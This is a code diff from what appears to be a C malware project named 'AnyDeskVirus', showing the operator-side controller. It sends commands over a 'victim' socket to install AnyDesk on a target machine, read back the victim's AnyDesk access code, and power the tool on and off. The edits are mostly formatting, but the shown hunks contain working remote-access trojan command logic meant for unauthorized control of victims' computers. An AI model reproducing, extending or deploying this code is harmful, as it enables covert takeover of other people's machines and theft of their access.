@@ -1,10 +1,9 @@
 #include <Windows.h>
 #include <stdio.h>
 
-#define ANYDESK_FILE_PATH "C:\\Users\\magshimim\\Desktop\\CProjets\\AnyDeskVirus\\anyDeskFile\\AnyDesk.exe"
+#define ANYDESK_FILE_PATH "C:\\Users\\Matan\\Documents\\CProjects\\AnyDeskVirus\\anyDeskFile\\AnyDesk.exe"
 #define BUFFER_SIZE 1024
 #define ANYDESK_CODE_ERROR "no-code__" // The code has to be 9 digits
-
 
 // Functions
 void displayHelp();
@@ -47,10 +46,12 @@ void installAnyDesk(int victimSocket)
     printf("The Installing has been successfully completed!\n");
 
     victimAnydeskCode = getCode(victimSocket);
-    if(victimAnydeskCode == ANYDESK_CODE_ERROR){
+    if (victimAnydeskCode == ANYDESK_CODE_ERROR)
+    {
         printf("There is no code...\n");
     }
-    else{
+    else
+    {
         printf("The victim anydesk code is: %s\n", victimAnydeskCode);
     }
 
@@ -124,10 +125,11 @@ void powerOnAnyDesk(int victimSocket)
     param 1: the victim socket
     */
     printf("Powering on...");
-    
+
     // Sends the command
     int command = htonl(2);
-    if(send(victimSocket, (char *)&command, sizeof(command), 0) == SOCKET_ERROR){
+    if (send(victimSocket, (char *)&command, sizeof(command), 0) == SOCKET_ERROR)
+    {
         printf("Error in sending the powering on command : %d\n", GetLastError());
         return;
     }
@@ -143,10 +145,11 @@ void powerOffAnyDesk(int victimSocket)
     param 1: the victim socket
     */
     printf("Powering off...");
-    
+
     // Sends the command
     int command = htonl(3);
-    if(send(victimSocket, (char *)&command, sizeof(command), 0) == SOCKET_ERROR){
+    if (send(victimSocket, (char *)&command, sizeof(command), 0) == SOCKET_ERROR)
+    {
         printf("Error in sending the powering off command : %d\n", GetLastError());
         return;
     }
